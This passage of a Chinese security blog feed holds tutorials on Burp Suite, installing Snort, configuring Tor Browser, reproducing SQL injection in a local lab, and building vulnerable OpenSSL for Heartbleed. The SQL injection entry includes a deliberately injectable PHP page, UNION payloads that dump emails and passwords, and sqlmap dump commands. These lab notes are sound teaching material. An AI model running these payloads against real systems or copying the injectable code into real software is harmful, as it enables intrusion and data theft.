src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp15.png"></p><h2 id="0x05-未完待续"><a href="#0x05-未完待续" class="headerlink" title="0x05 未完待续"></a>0x05 未完待续</h2><p>Burpsuite是一个非常非常好用的工具，由于篇幅问题这里暂时只介绍这几种常用的功能。下次有时间可以写一下爬虫部分和验证码处理插件。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BurpSuite</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu16.04安装snort</title>
    <link href="/2018/03/17/ubuntu16.04%E5%AE%89%E8%A3%85snort/"/>
    <url>/2018/03/17/ubuntu16.04%E5%AE%89%E8%A3%85snort/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-snort是什么？"><a href="#0x00-snort是什么？" class="headerlink" title="0x00 snort是什么？"></a>0x00 snort是什么？</h2><p>snort是一款开源的入侵检测系统，由Marty Roesch先生用C语言开发，直至今天，Snort已发展成为一个多平台(Multi-Platform),实时(Real-Time)流量分析，网络IP数据包(Pocket)记录等特性的强大的网络入侵检测/防御系统。  </p><h2 id="0x01-snort安装"><a href="#0x01-snort安装" class="headerlink" title="0x01 snort安装"></a>0x01 snort安装</h2><p>这里主要讲ubuntu下通过编译源码的安装方法  </p><p>首先，我们在snort官方 <a href="http://www.snort.org/">www.snort.org</a> 下查看最新版本的源码。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/snort/snort01.png"></p><p>然后在terminal中输入如下指令获取daq源码包和snort源码包</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>www.snort.org<span class="hljs-regexp">/downloads/</span>snort/daq-<span class="hljs-number">2.0</span>.<span class="hljs-number">6</span>.tar.gz<br>wget https:<span class="hljs-regexp">//</span>www.snort.org<span class="hljs-regexp">/downloads/</span>snort/snort-<span class="hljs-number">2.9</span>.<span class="hljs-number">11.1</span>.tar.gz<br></code></pre></td></tr></table></figure><p>接着解压源码包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> xvzf daq-<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span>.tar.gz<br><span class="hljs-attribute">tar</span> xvzf snort-<span class="hljs-number">2.9.11.1</span>.tar.gz<br></code></pre></td></tr></table></figure><p>然后我们安装一下daq所依赖的一些开发包，否则直接编译安装会出现flex、bison和libpcap错误</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> install flex<br>sudo apt-<span class="hljs-builtin-name">get</span> install bison<br>sudo apt-<span class="hljs-builtin-name">get</span> install libpcap-dev<br></code></pre></td></tr></table></figure><p>然后先进入解压后daq的路径，进行编译安装</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> daq-<span class="hljs-number">2.0</span>.<span class="hljs-number">6</span><br>./configure &amp;&amp; <span class="hljs-keyword">make</span> &amp;&amp; <span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/snort/snort02.jpg"></p><p>结果如下没有报错说明我们安装完成。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/snort/snort03.jpg"></p><p>接着我们要安装一下snort所依赖的一些开发包，否则配置脚本会由于缺少libpcre-dev、libdumbnet-dev 和zlib开发库而报错。</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs q">sudo apt-<span class="hljs-built_in">get</span> install libpcre3-<span class="hljs-built_in">dev</span><br>sudo apt-<span class="hljs-built_in">get</span> install libdumbnet-<span class="hljs-built_in">dev</span><br>sudo apt-<span class="hljs-built_in">get</span> install zlib1g-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><p>然后我们在local创建一个目录,再进入刚才解压的snort目录中，编译安装snort</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir <span class="hljs-regexp">/usr/</span>local/snort<br>.<span class="hljs-regexp">/configure --prefix=/u</span>sr<span class="hljs-regexp">/local/</span>snort/ --enable-sourcefire &amp;&amp; make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>结果如下没有报错说明我们安装完成。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/snort/snort04.jpg"></p><p>然后我们进入刚才创建的目录，并进入它的子目录bin来运行snort</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/snort/</span>bin<br>./snort<br></code></pre></td></tr></table></figure><p>我们可以看到它处在promisc模式（包转储模式）。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/snort/snort05.jpg"></p><p>至此，我们snort安装完成。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>snort</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>配置tor browser实现访问暗网</title>
    <link href="/2018/03/01/%E9%85%8D%E7%BD%AEtor-browser%E5%AE%9E%E7%8E%B0%E8%AE%BF%E9%97%AE%E6%9A%97%E7%BD%91/"/>
    <url>/2018/03/01/%E9%85%8D%E7%BD%AEtor-browser%E5%AE%9E%E7%8E%B0%E8%AE%BF%E9%97%AE%E6%9A%97%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<p>写这一篇博客犹豫了很久，最终还是决定发表出来，毕竟技术本无对错，但我们要明辨是非。  </p><h2 id="0x00-暗网"><a href="#0x00-暗网" class="headerlink" title="0x00 暗网"></a>0x00 暗网</h2><p>暗网是指那些存储在网络数据库里、但不能通过超链接访问而需要通过动态网页技术访问的资源集合，不属于那些可以被标准搜索引擎索引的表面网络。  </p><p>但当今的爬虫并非完全爬行不到Hidden Web后台数据库内，一些主要的搜索引擎已经覆盖Hidden Web大约三分之一的内容。然而，在覆盖率上当前搜索引擎存在技术上的本质缺陷。  </p><h2 id="0x01-tor工作原理"><a href="#0x01-tor工作原理" class="headerlink" title="0x01 tor工作原理"></a>0x01 tor工作原理</h2><p>Tor由已经安装了Tor软件的电脑连接网络而成。它之所以被称为onion，是因为它的结构就跟洋葱相同，你只能看出它的外表，而想要看到核心，就必须把它层层的剥开。即每个路由器间的传输都经过点对点密钥（symmetric key）来加密，形成有层次的结构。它中间所经过的各节点，都好像洋葱的一层皮，把客户端包在里面，算是保护信息来源的一种方式。</p><p>用 Tor 创建一条私有网络路径时，用户的软件或客户端通过网络上的中继递增地建立一条由若干加密连接组成的环路（circuit）。环路一次扩展一跳（hop），环路上的中继仅仅知道它从哪一个中继接收数据以及向哪一个中继发送数据。没有一台单独的中继会知道数据包的完整路径。客户端与环路上的每一跳都协商一组独立的密钥，这样可以保证数据通过任何一跳时都无法跟踪。  </p><h2 id="0x02-tor-browser浏览器"><a href="#0x02-tor-browser浏览器" class="headerlink" title="0x02 tor browser浏览器"></a>0x02 tor browser浏览器</h2><p>tor browser的最大特点就是匿名性。</p><ul><li><p>您的互联网服务提供商和任何本地的监视者都将无法查看您的连接、跟踪您的网络活动，包括您所访问网站的名称和地址。</p></li><li><p>您使用的网站和服务的运营商以及任何监视它们的人都将看到连接来自 Tor 网络而不是您的互联网IP地址，并且不知道您是谁，除非您明确标识自己。</p></li></ul><h2 id="0x03-配置过程"><a href="#0x03-配置过程" class="headerlink" title="0x03 配置过程"></a>0x03 配置过程</h2><p>首先我们下载安装tor browser<br>下载地址： <a href="https://tor-browser.en.softonic.com/">https://tor-browser.en.softonic.com/</a>  </p><p>然后我们运行tor browser进行配置：  </p><p>首先我们知道国内是无法直连的，所以我们要选择configure来配置代理。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/tor/tor01.png">  </p><p>然后在你的网络提供商是否对Tor网络进行了封锁或审查这里选yes。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/tor/tor02.png"></p><p>选了yes就要配置网桥，这里我们可以使用他提供的一些集成网桥，但是速度比较慢，自己去试试速度然后选个合适的。  </p><p>但是我们想要更快更稳定的话，我们可以访问访问 <a href="https://bridges.torproject.org/bridges?transport=obfs4">https://bridges.torproject.org/bridges?transport=obfs4</a> 获取obfs4网桥 。 </p><p>然后在<a href="https://link.jianshu.com/?t=https://atlas.torproject.org/#search/%E7%BD%91%E5%9D%80%E5%90%8E%E9%9D%A2%E5%8A%A0%E5%85%A5%E5%88%9A%E6%89%8D%E8%8E%B7%E5%8F%96%E7%BD%91%E6%A1%A5%E4%B8%AD%E9%97%B4%E7%9A%84%E5%9B%9B%E5%8D%81%E4%BD%8D%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9D%A5%E6%B5%8B%E8%AF%95%E8%BF%9E%E6%8E%A5%E9%80%9F%E5%BA%A6%E3%80%82">https://link.jianshu.com/?t=https://atlas.torproject.org/#search/网址后面加入刚才获取网桥中间的四十位字母数字来测试连接速度。</a>  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/tor/tor03.png"></p><p>速度足够快的我们保留下来几条，选自定义网桥，然后逐条填在里面。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/tor/tor04.png"></p><p>其实这里配置已经可以使用了，但是在下一步如果我们有vpn的话，就直接选择使用本地代理，然后如果使用的是ss的话，那就直接选sock5协议，地址填127.0.0.1，端口填1080即可。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/tor/tor05.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/tor/tor06.png"></p><p>在这里为什么我们还要选择vpn呢？因为GFW的原因，很多的网桥都失效了，我们很难找到能用的网桥，就算找到了，速度也非常慢，所以如果有vpn的话，我们就可以直接绕过ISP对Tor的审查，并且速度也会非常快。  </p><p>接着我们选择connect，稍微等几十秒配置成功，就可以使用了。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/tor/tor07.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/tor/tor08.png"></p><p>然后我们需要找一些暗网的导航网站，如<a href="https://hiddenwikitor.com/">https://hiddenwikitor.com/</a><br>然后去寻找我们需要的网站。但是千万谨记隐藏自己的真实身份。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/tor/tor09.png"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>暗网因为其匿名性，缺乏监管，变成了一个鱼龙混杂的地方，它是互联网真正的暗面。我们小小的满足了一下好奇心，然后就应该明白我们并不属于这里。</p>]]></content>
    
    
    <categories>
      
      <category>暗网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tor</tag>
      
      <tag>暗网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入漏洞复现</title>
    <link href="/2018/01/27/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2018/01/27/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-sql注入"><a href="#0x00-sql注入" class="headerlink" title="0x00 sql注入"></a>0x00 sql注入</h2><p>SQL注入是用户从正常的www访问通过全局变量POST和GET提交一些sql语句对数据库的数据进行操作。  </p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>安装MariaDB、PHP、Apache环境:  </p><p>安装MariaDB：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">sudo yum install -y mysql mysql-<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>安装apache：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo yum <span class="hljs-keyword">install</span> -y httpd<br></code></pre></td></tr></table></figure><p>安装php：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo yum <span class="hljs-keyword">install</span> -y php<br></code></pre></td></tr></table></figure><p>安装php的一些组件：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo yum <span class="hljs-keyword">install</span> -y php-gd libjpeg* php-imap php-ldap php-odbc php-pear php-mysqlnd<br></code></pre></td></tr></table></figure><p>安装完成后编辑配置文件，然后重启httpd和mariadb。  </p><h2 id="0x02-搭载存在SQL注入的php页面"><a href="#0x02-搭载存在SQL注入的php页面" class="headerlink" title="0x02 搭载存在SQL注入的php页面"></a>0x02 搭载存在SQL注入的php页面</h2><p>首先输入mysql -u root -p<br>然后输入密码进入数据库，创建一个test的数据库，然后在test里创建一个名为users的表单，表单中写入如下三组数据作为测试数据。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%871.png"></p><p>然后在/var/www/html目录创建select.php<br>在select.php中写入一个存在SQL注入的代码段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;test&quot;</span>;<br><br><span class="hljs-comment">// 创建连接</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// Check connection</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败: &quot;</span> . <span class="hljs-variable">$conn</span>-&gt;connect_error);<br>&#125;<br><span class="hljs-variable">$id</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<span class="hljs-comment">//接受get传递的参数名x的值并赋值给变量id</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where id=<span class="hljs-subst">$id</span>&quot;</span>;<span class="hljs-comment">//定义sql语句并组合变量id</span><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_assoc()) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Id: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>]. <span class="hljs-string">&quot;  Name: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>]. <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <br><span class="hljs-variable">$conn</span>-&gt;close();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码的作用是读取一个输入的变量id，然后通过id查询数据库中这个id对应的username。  </p><p>测试一下效果，通过读入x=1出现下面结果说明成功。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%872.png"></p><h2 id="0x03-手工注入"><a href="#0x03-手工注入" class="headerlink" title="0x03 手工注入"></a>0x03 手工注入</h2><p>(1)判断是否存在SQL注入  </p><p>与一个正确的式子时，结果不变。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%873.png"></p><p>与一个错误的式子，结果改变，说明存在注入点。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%874.png"></p><p>(2)当前数据库权限判断<br>提交and ord(mid(user(),1,1))=114如果页面正常则为root权限，下图可以看出是root权限</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%875.png"></p><p>(3)判断字段数<br>提交union select * from users order by 数字填猜测的字段数，下图可见，填4可以正常显示，填5不能，所以字段数是4个。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%876.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%877.png"></p><p>(4)获取数据库库名<br>获取字段数之后，我们就构造 and 1=2 union select 1,schema_name,3,4 from information_schema.schemata来查询所有数据库名  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%878.png"></p><p>这里的1一直到4，就是之前找到的四个字段，然后information_schema库的schemata表中的schema_name字段就存着数据库名。</p><p>(5)获取数据库表名<br>获取数据库名之后，我们就构造 and 1=2 union select 1,table_name,3,4 from information_schema.tables where table_schema=0x76657374来查询test数据库下的所有表名  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%879.png"></p><p>这里的1一直到4，就是之前找到的四个字段，然后information_schema库的tables表中的table_name字段就存着表名，where后面的限定条件用来选择数据库，等号后面填数据库ascii编码的十六进制（如test是0x76657374）。</p><p>(6)获取数据库字段名<br>获取数据库名和表名之后，我们就构造 and 1=2 union select 1,column_name,3,4 from information_schema.columns where table_name=0x7573657273 and table_schema=0x76657374来查询test数据库下users表中的所有字段名。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%8710.png"></p><p>这里的1一直到4，就是之前找到的四个字段，然后information_schema库的columns表中的column_name字段就存着字段名，where后面的限定条件用来选择数据库和对应表，等号后面填数据库和表的ascii编码的十六进制（如test是0x76657374，users是0x7573657273）。</p><p>(7)获取数据<br>已经获取了字段名和其顺序，我们知道了之前输出的位置是1，2号位的id和username，然后我们需要输出password和email到1，2号位，所以构造<br>and 1=2 union select email,password,3,4 from test.users<br>来查询test数据库下users表的email和password，获取这些数据。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%8711.png"></p><h2 id="0x04-sqlmap注入"><a href="#0x04-sqlmap注入" class="headerlink" title="0x04 sqlmap注入"></a>0x04 sqlmap注入</h2><p>使用sqlmap时我们有以下几种探测方式<br>参数：–technique<br>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。<br>支持的探测方式如下：  </p><ul><li>B: Boolean-based blind SQL injection（布尔型注入）</li><li>E: Error-based SQL injection（报错型注入）</li><li>U: UNION query SQL injection（可联合查询注入）</li><li>S: Stacked queries SQL injection（可多语句查询注入）</li><li>T: Time-based blind SQL injection（基于时间延迟注入）</li></ul><p>我们先用默认方式测试一下：  </p><p>先查看有哪些数据库：<br>sqlmap -u “192.168.0.104/select.php?x=1” –dbs</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%8712.png"></p><p>然后查看test数据库中的所有表:<br>sqlmap -u “192.168.0.104/select.php?x=1” -D test –tables</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%8713.png"></p><p>然后查看users表中所有字段:<br>sqlmap -u “192.168.0.104/select.php?x=1” –D test -T users –columns</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%8714.png"></p><p>然后查看password字段中所有值:<br>sqlmap -u “192.168.0.104/select.php?x=1” –D test -T users -C password –dump  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%8715.png"></p><h2 id="0x05-抓包分析"><a href="#0x05-抓包分析" class="headerlink" title="0x05 抓包分析"></a>0x05 抓包分析</h2><p>我们再对其中几种注入方式进行抓包分析：  </p><ul><li><p>sqlmap Union注入  </p><p>  可联合查询注入，通过UNION查询获取到所有想要的数据。</p><p>  使用场景：请求返回后能输出SQL执行后查询到的所有内容。  </p><p>  sqlmap -u “192.168.43.63/select.php?x=1” -D test –tables –technique=U</p></li></ul><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%8716.png"></p><p>从wireshrak抓包可以看到，只通过http请求从返回的信息中获取数据。  </p><ul><li><p>sqlmap Boolean Based注入</p><p>  布尔型注入，可以根据返回页面判断条件真假的注入。</p><p>  使用场景：我们无法根据应用程序的返回页面得到我们需要的数据库信息。但是可以通过构造逻辑判断（比较大小）来得到我们需要的信息。  </p><p>  sqlmap -u “192.168.43.63/select.php?x=1”–dbs –technique=B</p></li></ul><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%8717.png"></p><p>从wireshark抓包我们可以看到，sqlmap一直在构造逻辑，然后通过反回的Error（500）或者ok（200）来得到信息。  </p><ul><li><p>sqlmap Time Based注入</p><p>  基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p><p>  应用场景 ： 页面不会返回错误信息，不会输出UNION注入所查出来的泄露的信息。类似搜索这类请求，boolean注入也无能为力，因为搜索返回空也属于正常的，这时就得采用time-based的注入了，即判断请求响应的时间，但该类型注入获取信息的速度非常慢。  </p><p>  sqlmap -u “192.168.43.63/select.php?x=1” –dbs –technique=T –flush-session</p><p>  因为之前已经抓取到了数据库，为了防止结果影响，在这里加入–flush-session参数来清空之前的session，重新测试该目标。</p></li></ul><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_injection/%E5%9B%BE%E7%89%8718.png"></p><p>从wireshark中可以看出，sqlmap在构造sleep函数，不通过返回来判断结果，而是通过返回的时间是否在预期内来判断是否存在注入点。  </p><h2 id="0x08-危害"><a href="#0x08-危害" class="headerlink" title="0x08 危害"></a>0x08 危害</h2><ul><li>入侵者可以通过网页来提交mysql语句对公司数据库敏感数据进行读取，配合python脚本可以获取整个数据库的数据。</li><li>入侵者可以对公司数据库数据进行篡改，造成巨大损失。</li><li>入侵者可以私自添加系统账号或是数据库使用者账号，拿到webshell，然后进而控制整个web服务器。</li></ul><h2 id="0x09-应对方案"><a href="#0x09-应对方案" class="headerlink" title="0x09 应对方案"></a>0x09 应对方案</h2><ul><li><p>1.对输入参数进行验证</p></li><li><p>2.特殊字符过滤</p></li><li><p>3.使用参数化语句，不要拼接sql</p></li><li><p>4.编码输出</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>mysql</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>openssl心脏出血漏洞</title>
    <link href="/2018/01/27/openssl%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/01/27/openssl%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-heartbleed漏洞"><a href="#0x00-heartbleed漏洞" class="headerlink" title="0x00 heartbleed漏洞"></a>0x00 heartbleed漏洞</h2><p>Heartbleed漏洞，这项严重缺陷(CVE-2014-0160)的产生是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。  </p><h2 id="0x02-基本背景和影响"><a href="#0x02-基本背景和影响" class="headerlink" title="0x02 基本背景和影响"></a>0x02 基本背景和影响</h2><p>OpenSSL心脏出血漏洞的大概原理是OpenSSL在2年前引入了心跳(heartbeat)机制来维持TLS链接的长期存在，心跳机制是作为TLS的扩展实现，但在代码中包括TLS(TCP)和DTLS(UDP)都没有做边界的检测，所以导致攻击者可以利用这个漏洞来获得TLS链接对端（可以是服务器，也可以是客户端）内存中的一些数据，至少可以获得16KB每次，理论上讲最大可以获取64KB。  </p><p>OpenSSL是为网络通信提供安全及数据完整性的一种安全协议，囊括了主要的密码算法、常用的密钥和证书封装管理功能以及SSL协议．多数SSL加密网站是用名为OpenSSL的开源软件包，由于这也是互联网应用最广泛的安全传输方法，被网银、在线支付、电商网站、门户网站、电子邮件等重要网站广泛使用，所以漏洞影响范围广大。  </p><h2 id="0x03-openssl编译安装"><a href="#0x03-openssl编译安装" class="headerlink" title="0x03 openssl编译安装"></a>0x03 openssl编译安装</h2><p>1、安装配置openssl并解决本机自带openssl<br>因为要替换本机版本，所以我们要用到编译安装<br>首先下载最后受漏洞影响的1.0.1f版本  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://www.openssl.org/source/old/<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/openssl-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>f.tar.gz<br></code></pre></td></tr></table></figure><p>先执行命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> /usr/bin/pod2<span class="hljs-built_in">man</span><br></code></pre></td></tr></table></figure><p>防止编译安装openssl报错：POD document had syntax errors at /usr/bin/pod2man line 69. make: *** [install_docs]  </p><p>然后解压下载的openssl后，在解压后的目录输入下面命令编译安装到/usr/local/openssl目录  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/config shared zlib  --prefix=/u</span>sr<span class="hljs-regexp">/local/</span>openssl &amp;&amp; make &amp;&amp; make install <br></code></pre></td></tr></table></figure><p>等待编译完成，依次执行以下命令</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss">./config -t<br><span class="hljs-built_in">make</span> depend<br>cd /usr/<span class="hljs-keyword">local</span><br><span class="hljs-built_in">ln</span> -s openssl ssl<br></code></pre></td></tr></table></figure><p>在/etc/ld.so.conf文件的最后面，添加如下内容：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/openssl/</span>lib<br>ldconfig<br></code></pre></td></tr></table></figure><p>添加OPENSSL的环境变量：<br>在etc/profile的最后一行，添加：  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">OPENSSL</span>=/usr/local/openssl/bin<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$OPENSSL</span>:$PATH:$HOME/bin<br></code></pre></td></tr></table></figure><p>退出命令界面，再从新登录。  </p><p>依次执行下列名令，移除原版本的openssl，创建新的软连接</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">mv <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/openssl /u</span>sr<span class="hljs-regexp">/bin/</span>openssl.old<br>mv <span class="hljs-regexp">/usr/i</span>nclude<span class="hljs-regexp">/openssl /u</span>sr<span class="hljs-regexp">/include/</span>openssl.old<br>ln -s <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/openssl/</span>bin<span class="hljs-regexp">/openssl /u</span>sr<span class="hljs-regexp">/bin/</span>openssl<br>ln -s <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/openssl/i</span>nclude<span class="hljs-regexp">/openssl /u</span>sr<span 